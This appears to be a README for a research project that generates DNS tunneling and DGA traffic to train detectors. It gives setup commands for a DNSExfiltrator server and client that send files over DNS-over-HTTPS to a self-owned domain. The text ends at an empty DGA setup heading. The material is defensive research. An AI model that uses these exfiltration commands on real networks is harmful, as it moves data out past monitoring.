# Generation and Classification of DGA and DNS Tunneling Traffic

This project focuses on simulating, capturing, and analyzing Domain Generation Algorithm (DGA) and DNS tunneling traffic. It provides a framework to study malicious DNS traffic patterns and train models or tools for classification and detection.

## 📌 Objectives

- Generate DNS tunneling traffic using various tools.
- Simulate DGA traffic patterns.
- Capture and analyze DNS queries and responses.
- Classify DGA vs. DNS tunneling traffic.

## 🧰 Tools and Software Used

| Tool           | Purpose                                                                 |
|----------------|-------------------------------------------------------------------------|
| [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) | Generate DNS tunneling traffic (data exfiltration). |
| [dnsproxy](https://github.com/AdguardTeam/dnsproxy)       | DNS proxy server supporting DoH, DoT, DoQ, DNSCrypt. |
| [CoreDNS](https://coredns.io/)                            | Pluggable DNS server for collecting and logging DNS queries. |
| [doh-server](https://github.com/m13253/dns-over-https)    | DNS-over-HTTPS server for simulating encrypted DNS traffic. |
| [dohlyzer](https://github.com/ahlashkari/DoHLyzer)           | Analyzes DoH traffic to detect anomalies and exfiltration. |

## 📦 Requirements

- DNS Server and Domain: any domain owned example: dohe.live and tunnel.dohe.live in this experiment
- DNSExfiltrator: for client and server
- dnsproxy: for client
- doh-server: for server
- Coredns: for server
  
## 🛠️ Installation


### DNSEXFILTRATOR SETUP

DNSExfiltrator is a proof-of-concept (PoC) tool designed to demonstrate how data can be exfiltrated over the DNS protocol. It works by encoding data into DNS queries, which are sent to an attacker-controlled domain. A DNS server controlled by the attacker decodes the incoming queries and reconstructs the original data.
This technique is commonly used in real-world scenarios where traditional outbound channels (HTTP, FTP, etc.) are monitored or blocked, but DNS traffic is still permitted. DNSExfiltrator helps simulate this behavior for research, detection, and defense testing.

In this project, DNSExfiltrator is used to generate labeled examples of DNS tunneling traffic. We use DNSExfiltrator to send 100 txt files over DNS to our remote server. We use DNS-over-HTTPS (DoH) protocol to send data. 

#### SERVER SETUP

- First we setup our server on any virtual machine.
  System version : Ubuntu 22.04
  
#### Coredns Installation: 

Install go version 1.21.4

```bash
sudo install golang-go
```

Install coredns from https://github.com/coredns/coredns

```bash
git clone https://github.com/coredns/coredns
cd coredns
make
```

or Install binary directly from https://github.com/coredns/coredns/releases/tag/v1.12.1

```bash
# Download the CoreDNS archive
wget https://github.com/coredns/coredns/releases/download/v1.12.1/coredns_1.12.1_linux_amd64.tgz

# Extract the archive
tar -xvzf coredns_1.12.1_linux_amd64.tgz
```

```bash
# Move the binary to /usr/local/bin (optional but recommended)
sudo mv coredns /usr/local/bin/

# Make sure it's executable (if needed)
sudo chmod +x /usr/local/bin/coredns

# Verify installation
coredns -version
```

Create Corefile inside /etc/coredns/

Corefile:
```
tunnel.dohe.live {
    file /etc/coredns/db.dohe.live
    log
    errors
}
```

Create db.dohe.live file inside /etc/coredns/

db.dohe.live :
```
$ORIGIN tunnel.dohe.live.
$TTL 60
@   IN  SOA ns1.dohe.live. admin.dohe.live. (
        2025042601 ; serial
        3600       ; refresh
        1800       ; retry
        604800     ; expire
        60         ; minimum
    )
    IN  NS  ns1.dohe.live.
    IN  A   XX.XX.XX.XX
```

Use your own domain name in place of dohe.live and the server ip address in A.

Run coredns: 

```bash
coredns --conf Corefile
```

verify using 

```bash
dig tunnel.dohe.live
```

if it returns your server ip, everything is set up correctly.


#### DNSExfiltrator Installation : 

install python version 2.7 and pip for python2: 

```bash
sudo apt update
sudo apt install python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
```

Install DNSExfiltrator :

```bash
git clone https://github.com/Arno0x/DNSExfiltrator
cd DNSExfiltrator
python2 -m pip install -r requirements.txt
```

check if port 53 is being used and kill any processes running on port 53

```bash
sudo systemctl stop systemd-resolved
```

Run DNSExfiltrator server using :

```bash
 python2 dnsexfiltrator.py -d tunnel.dohe.live -p password
```
to keep the server running for long durations, the server can be run as a bsckground process.   

The server is now setup and any computer can send files via dns-over-https to the server using tunnel.dohe.live as domain.  
Users can change domain name and password as needed.


#### CLIENT SETUP

#### DNSExfiltrator Installation: 

System requirements : Windows, powershell

```bash
git clone https://github.com/Arno0x/DNSExfiltrator
cd DNSExfiltrator
```

To Run DNSExfiltrator (from DNSExfiltrator/release directory):

```powershell
./dnsExfiltrator.exe <file name> <domain> <password>
```

To send 100 text files we use the scripts inside DNSExfiltrator.  
gen_data.sh -> generates 100 random txt files  
exfil_data.sh -> sends the 100 txt files to our server continously for 8 hours.

We send these files over DoH and capture the traffic using wireshark.  

To send them over DoH we need dnsproxy, which sends all DNS Traffic over https using adgurad or google dns servers.

#### dnsproxy Installation: 

There are several options how to install dnsproxy.

- Grab the binary for your device/OS from the [Releases](https://github.com/AdguardTeam/dnsproxy/releases) page.
- using make build from the following repo: [dnsproxy](https://github.com/AdguardTeam/dnsproxy)


Usage : 

Run dnsproxy using :

```bash
dnsproxy.exe -l 127.0.0.1 -p 53 -u https://dns.adguard.com/dns-query -b 8.8.8.8:53
```
or
```bash
dnsproxy.exe -l 127.0.0.1 -p 53 -u https://dns.google/dns-query -b 8.8.8.8:53
```

this run dnsproxy on localhost port 53 and sends all dns requests upstream to adguard or google server over https.  
It forwards all requests to tunnel.dohe.live to our server where DNSExfiltrator is running.


The traffic captured is given in the dnsexfil_pcaps folder which is converted to csv using DoHLyzer.


### DGA SETUP 

Domain Generation Algorithms (DGAs) are techniques used by malware to algorithmically generate a large number of domain names that can be used for command-and-control (C2) communication. Instead of hardcoding a single server address, DGAs allow malware to contact different domains daily or even hourly, making it more difficult for defenders to block malicious traffic or take down C2 servers.  


#### SERVER SETUP :




